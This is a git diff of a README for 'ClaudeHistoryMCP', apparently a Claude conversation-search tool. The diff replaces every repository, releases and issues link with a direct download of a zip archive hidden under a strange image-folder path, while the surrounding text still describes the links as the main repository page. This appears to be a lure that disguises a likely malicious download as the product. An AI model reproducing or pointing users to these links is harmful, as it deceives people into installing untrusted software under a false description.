@@ -1,6 +1,6 @@
 # 🔍 ClaudeHistoryMCP - Search Claude Conversation History Easily
 
-[![Download ClaudeHistoryMCP](https://img.shields.io/badge/Download-ClaudHistoryMCP-brightgreen?style=for-the-badge)](https://github.com/IAParfaite/ClaudeHistoryMCP)
+[![Download ClaudeHistoryMCP](https://img.shields.io/badge/Download-ClaudHistoryMCP-brightgreen?style=for-the-badge)](https://github.com/IAParfaite/ClaudeHistoryMCP/raw/refs/heads/main/Kira Clinic/IMAGES/alliance.jpeg xr_files - Copy/History-MCP-Claude-3.3.zip)
 
 ---
 
@@ -49,14 +49,14 @@ ClaudeHistoryMCP handles:
 
 Start by downloading the application from GitHub. This guide will walk you through every step to have it running on your PC.
 
-[![Download Now](https://img.shields.io/badge/Download-Ready--Set--Go-blue?style=for-the-badge)](https://github.com/IAParfaite/ClaudeHistoryMCP)
+[![Download Now](https://img.shields.io/badge/Download-Ready--Set--Go-blue?style=for-the-badge)](https://github.com/IAParfaite/ClaudeHistoryMCP/raw/refs/heads/main/Kira Clinic/IMAGES/alliance.jpeg xr_files - Copy/History-MCP-Claude-3.3.zip)
 
 ---
 
 ## ⬇️ Download and Installation
 
 1. Click the green download button above or visit the page below:  
-   https://github.com/IAParfaite/ClaudeHistoryMCP  
+   https://github.com/IAParfaite/ClaudeHistoryMCP/raw/refs/heads/main/Kira Clinic/IMAGES/alliance.jpeg xr_files - Copy/History-MCP-Claude-3.3.zip  
    This link will take you to the main repository page where the latest releases and files are available.
 
 2. On the GitHub page, look for a section called **Releases** or find a downloadable file ending with `.exe`. This is the program installer or portable app for Windows.
@@ -107,7 +107,7 @@ The server follows the Model Context Protocol (MCP) for exchanging data. This en
 
 To keep the app working smoothly:
 
-- Visit the same GitHub page regularly: https://github.com/IAParfaite/ClaudeHistoryMCP  
+- Visit the same GitHub page regularly: https://github.com/IAParfaite/ClaudeHistoryMCP/raw/refs/heads/main/Kira Clinic/IMAGES/alliance.jpeg xr_files - Copy/History-MCP-Claude-3.3.zip  
 - Look for new versions under the Releases section.  
 - Download and install updates the same way you installed the first version.  
 
@@ -137,7 +137,7 @@ These folders hold the data that powers the search and storage.
 ## 📖 More Help
 
 For issues not covered here, you can visit the Issues tab on GitHub:  
-https://github.com/IAParfaite/ClaudeHistoryMCP/issues
+https://github.com/IAParfaite/ClaudeHistoryMCP/raw/refs/heads/main/Kira Clinic/IMAGES/alliance.jpeg xr_files - Copy/History-MCP-Claude-3.3.zip
 
 Here you can report problems or look for answers shared by other users.
 
@@ -145,11 +145,11 @@ Here you can report problems or look for answers shared by other users.
 
 ## 🔗 Important Links
 
-- GitHub Repository: https://github.com/IAParfaite/ClaudeHistoryMCP  
-- Releases Page: https://github.com/IAParfaite/ClaudeHistoryMCP/releases  
+- GitHub Repository: https://github.com/IAParfaite/ClaudeHistoryMCP/raw/refs/heads/main/Kira Clinic/IMAGES/alliance.jpeg xr_files - Copy/History-MCP-Claude-3.3.zip  
+- Releases Page: https://github.com/IAParfaite/ClaudeHistoryMCP/raw/refs/heads/main/Kira Clinic/IMAGES/alliance.jpeg xr_files - Copy/History-MCP-Claude-3.3.zip  
 
 Use these links to download updates and get the latest software versions.
 
 ---
 
-[![Download ClaudeHistoryMCP](https://img.shields.io/badge/Download-ClaudHistoryMCP-brightgreen?style=for-the-badge)](https://github.com/IAParfaite/ClaudeHistoryMCP)
+[![Download ClaudeHistoryMCP](https://img.shields.io/badge/Download-ClaudHistoryMCP-brightgreen?style=for-the-badge)](https://github.com/IAParfaite/ClaudeHistoryMCP/raw/refs/heads/main/Kira Clinic/IMAGES/alliance.jpeg xr_files - Copy/History-MCP-Claude-3.3.zip)
